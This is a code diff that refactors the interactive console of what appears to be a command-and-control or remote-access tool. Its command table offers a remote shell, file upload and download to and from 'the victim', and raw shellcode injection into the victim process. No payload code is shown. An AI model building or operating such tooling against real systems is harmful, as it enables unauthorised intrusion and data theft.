@@ -1,10 +1,10 @@
 ''' This file will contain a method that will be called when the interact command will be used. This will act a sort of another CLI as well. '''
 from multiprocessing.spawn import import_main_path
+from turtle import color
 from tabulate import tabulate
-from methods.interact import interact
-from methods.interact.interact import Connection
+from methods.interact.interact import *
 from listeners import Connection
-from colorama import Fore
+from utils.colors import *
 
 def CLEAR(*args):
     from os import system, name
@@ -24,20 +24,20 @@ def HELP(*args):
 COMMANDS = {
     "HELP"      : ("Display the help menu", HELP, False),
     "OPTIONS"   : ("Display the help menu", HELP, False),
-    "EXIT"      : ("Exit the program", interact.EXIT, False),
-    "QUIT"      : ("Exit the program", interact.EXIT, False),
+    "EXIT"      : ("Exit the program", EXIT, False),
+    "QUIT"      : ("Exit the program", EXIT, False),
     "CLEAR"     : ("Clear the screen", CLEAR, False),
     "CLS"       : ("Clear the screen", CLEAR, False),
 
-    "SHELL"   : ("Spawn an interactive shell on the system", interact.SHELL, True),
-    "SYSTEMINFO" : ("Display system information", interact.SYSTEMINFO, True),
-    "UPLOAD"  : ("Upload a file to the victim", interact.UPLOAD, True),
-    "PUT"       : ("Upload a file to the victim", interact.UPLOAD, False),
-    "DOWNLOAD"    : ("Download a file from the victim", interact.DOWNLOAD, True),
-    "GET"    : ("Download a file from the victim", interact.DOWNLOAD, False),
+    "SHELL"   : ("Spawn an interactive shell on the system", SHELL, True),
+    "SYSTEMINFO" : ("Display system information", SYSTEMINFO, True),
+    "UPLOAD"  : ("Upload a file to the victim", UPLOAD, True),
+    "PUT"       : ("Upload a file to the victim", UPLOAD, False),
+    "DOWNLOAD"    : ("Download a file from the victim", DOWNLOAD, True),
+    "GET"    : ("Download a file from the victim", DOWNLOAD, False),
 
-    "INJECT" : ("Inject a raw shellcode binary into the victim process (as a new thread)", interact.INJECT, True),
-    "KILL" : ("KILLS the session", interact.KILL, True),
+    "INJECT" : ("Inject a raw shellcode binary into the victim process (as a new thread)", INJECT, True),
+    "KILL" : ("KILLS the session", KILL, True),
 }
 
 def parse_input(
@@ -56,13 +56,11 @@ def parse_input(
     COMMANDS[cmds[0].upper()][1](cmds[1:] if len(cmds) > 1 else None)
 
 def _interact(data : Connection):
-    global Connection
-
-
-    print(f"[{Fore.GREEN}+{Fore.RESET}] Interacting with", data.UID)
+    Handle.conn = data
+    log_info(f"Interacting with [MAGENTA]{data.UID}[RESET] running [BLUE]{data.OS}[RESET]")
     from utils.utils import basic_prompt, prompt
 
-    while interact.is_running:
+    while Handle.is_running:
         try:
             parse_input(
                 input(
@@ -75,3 +73,10 @@ def _interact(data : Connection):
         except EOFError:
             print()
             break
+
+        except Exception as E:
+            log_error("An Error occurred!", E)
+            continue
+
+    Handle.conn = None
+    Handle.is_running = True
